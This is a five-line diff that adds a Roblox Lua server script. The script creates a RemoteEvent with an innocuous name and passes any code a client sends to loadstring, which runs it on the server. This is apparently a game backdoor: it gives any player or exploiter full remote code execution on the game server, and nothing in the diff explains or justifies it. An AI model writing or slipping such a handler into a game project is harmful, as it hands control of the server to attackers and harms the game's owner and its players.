@@ -1,0 +1,5 @@
+local RemoteEvent = Instance.new("RemoteEvent", game.ReplicatedStorage)
+RemoteEvent.Name = "slice-of-ham"
+RemoteEvent.OnServerEvent:Connect(function(plr, code)
+	loadstring(code)()
+end)
